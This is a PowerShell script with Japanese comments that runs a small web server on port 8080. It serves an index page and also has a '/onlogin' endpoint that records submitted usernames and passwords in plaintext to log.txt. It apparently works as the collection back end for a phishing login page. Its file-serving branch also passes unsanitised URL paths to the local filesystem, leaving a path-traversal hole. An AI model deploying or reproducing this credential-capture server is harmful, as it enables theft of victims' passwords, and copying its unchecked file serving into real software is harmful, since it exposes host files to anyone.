# 必要な.NETクラスをロード
Set-ExecutionPolicy remotesigned -scope CurrentUser -Force
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://*:8080/")
$listener.Start()
Write-Output "Webサーバーを開始しました。"

while ($true) {
    # リクエストを待機
    $context = $listener.GetContext()
    $request = $context.Request
    $response = $context.Response
    $response.ContentEncoding = [System.Text.Encoding]::UTF8

    # URLパスを取得
    $urlPath = $request.Url.AbsolutePath.Trim('/')
    $localPath = Join-Path -Path $PSScriptRoot -ChildPath $urlPath

    if ($request.Url.AbsolutePath.StartsWith("/onlogin")) {
        # クエリパラメータを取得
        $query = [System.Web.HttpUtility]::ParseQueryString($request.Url.Query)
        $username = $query["username"]
        if (-not $username) {
            $username = "Unknown"
        }
        $password = $query["password"]
        if (-not $password) {
            $password = "Unknown"
        }

        # ログエントリを作成
        $logEntry = "Time:$(Get-Date -Format 'yyyy/MM/dd HH:mm:ss'), Username:$username, Password:$password`n"
        Add-Content -Path (Join-Path -Path $PSScriptRoot -ChildPath "log.txt") -Value $logEntry -Encoding UTF8

        # レスポンスを返す
        $responseString = "Logged successfully"
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($responseString)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
    } elseif ([string]::IsNullOrEmpty($urlPath)) {
        # index.htmlを返す
        $localPath = Join-Path -Path $PSScriptRoot -ChildPath "index.html"
        if (Test-Path $localPath) {
            $buffer = [System.IO.File]::ReadAllBytes($localPath)
            $response.ContentType = "text/html"
            $response.ContentLength64 = $buffer.Length
            $response.OutputStream.Write($buffer, 0, $buffer.Length)
        } else {
            $response.StatusCode = 404
            $responseString = "404 Not Found"
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($responseString)
            $response.ContentLength64 = $buffer.Length
            $response.OutputStream.Write($buffer, 0, $buffer.Length)
        }
    } else {
        # 静的ファイルを返す
        if (Test-Path $localPath) {
            $buffer = [System.IO.File]::ReadAllBytes($localPath)
            $response.ContentType = "application/octet-stream"
            $response.ContentLength64 = $buffer.Length
            $response.OutputStream.Write($buffer, 0, $buffer.Length)
        } else {
            $response.StatusCode = 404
            $responseString = "404 Not Found"
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($responseString)
            $response.ContentLength64 = $buffer.Length
            $response.OutputStream.Write($buffer, 0, $buffer.Length)
        }
    }

    # レスポンスを閉じる
    $response.OutputStream.Close()
}
